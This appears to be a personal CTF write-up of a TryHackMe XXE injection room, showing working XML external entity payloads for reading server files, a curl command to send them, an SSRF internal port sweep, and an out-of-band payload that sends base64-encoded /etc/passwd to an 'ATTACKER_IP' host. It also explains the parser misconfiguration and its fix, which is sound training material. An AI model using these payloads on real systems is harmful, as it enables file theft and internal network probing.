# XXE Injection (TryHackMe)

Room: XXE Injection — Web Application Pentesting / Injection Attacks. XML External Entity
exploitation against a PHP app whose XML parser resolves external entities
(`libxml_disable_entity_loader(false)` + `LIBXML_NOENT | LIBXML_DTDLOAD`). Completed: 2026-11-07 |
Target: <ip> (`XXE.Injection.v.1.4-badr`). Solved **fully headless from `C:\CTF`** with
`curl` and Python stdlib — no Burp, no browser, no AttackBox, and **no attacker server needed**
(both flags fall to in-band XXE).

## Answers

| Task | Question | Answer |
|---|---|---|
| 2 | Acronym SGML | *(find it yourself)* |
| 2 | Acronym DTD | *(find it yourself)* |
| 3 | Parser → full in-memory tree, random access | *(find it yourself)* |
| 4 | XXE where response is immediately disclosed (no external channel) | *(find it yourself)* |
| 4 | Content of `/opt/<redacted-hash>.txt` | `THM{…}` |
| 5 | XXE where server response is not visible | *(find it yourself)* |
| 6 | Flag in the internally-hosted application | `THM{…}` |
| 6 | Port the internal application is hosted on | *(find it yourself)* |

## In-band file read (Task 4)

`contact_submit.php` reads the raw POST body as XML and echoes the `name` element back
(`Thank you, <name>!`). That reflection is the exfil channel — point an external entity at the
target file:

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///opt/<redacted-hash>.txt" >]>
<contact>
<name>&xxe;</name>
<email>test@test.com</email>
<message>test</message>
</contact>
```

```bash
curl -s -X POST "http://<ip>/contact_submit.php" \
     -H "Content-Type: application/xml" --data-binary @xxe_task4.xml
# -> Thank you, THM{…} ! Your message has been received.
```

## XXE-as-SSRF — internal port sweep (Task 6)

Same reflected-`name` channel, but the entity targets an HTTP URL on the loopback interface. The
parser fetches `http://localhost:PORT/` and the body comes back inside the `Thank you, …`
wrapper, so a port running a service reflects **its own response** (closed ports reflect nothing):

```xml
<!ENTITY xxe SYSTEM "http://localhost:81/" >
```

`xxe_ssrf.py` threads this across ports (40 workers), strips the `Thank you, … !` wrapper, and
flags any non-empty inner body. One hit:

```
[+] port 81 -> 'Can you exfiltrate the flag?\n\nFlag: THM{…}'
```

The room frames this as Burp Intruder sorting responses by Length; headless, I just diff the inner
body against the empty-name baseline — same oracle, no GUI.

## Out-of-band (Task 5) — conceptual only

Task 5 (`index.php` → `submit.php`) stores the `file` element without echoing it, so it needs an
attacker-controlled server to exfil (Python `http.server`, a two-stage external `sample.dtd` with a
parameter entity + `php://filter/convert.base64-encode`). The room asks no flag for it — only the
term `Out-of-Band XXE` — so no OOB infrastructure was stood up. The mechanism, had it been needed:

```
<!ENTITY % cmd SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % oobxxe "<!ENTITY exfil SYSTEM 'http://ATTACKER_IP:1337/?data=%cmd;'>">
%oobxxe;
```

## Lessons

- **The reflection point is the whole game.** Any endpoint that parses attacker XML *and* echoes an
  element value back is in-band: a `file://` entity in that element leaks files, an `http://` entity
  turns the same hole into SSRF. No external listener required — which is why both flags here were
  reachable headless.
- **`file://` vs `php://filter`.** Plain `file:///opt/...` works when the target is clean text (this
  flag file). For binaries, source, or anything with `<`/`&` that would break the XML or get
  mangled, wrap it in `php://filter/convert.base64-encode/resource=...` and decode — same trick the
  OOB task uses, equally valid in-band.
- **SSRF port sweep, headless = diff the inner body.** The GUI workflow is "Intruder → sort by
  Length". Programmatically the equivalent is stripping the static `Thank you, … !` wrapper and
  testing whether anything remains; only a live internal service leaves a non-empty remainder.
- **Parser config is the root cause.** `libxml_disable_entity_loader(false)` plus
  `LIBXML_NOENT | LIBXML_DTDLOAD` on `DOMDocument->loadXML` is exactly the misconfiguration the
  mitigation task warns against — flip the loader to `true` (or move to `defusedxml` / JSON) and the
  entities never resolve.
- **Headless pattern** (cf. [[nosql-injection]], [[advanced-sql-injection]], [[hammer]]): `curl
  --data-binary @file` for a single crafted request, a small threaded `http.client` script for the
  port sweep — all from `C:\CTF`. Oracle is the reflected `name` value in the response body.
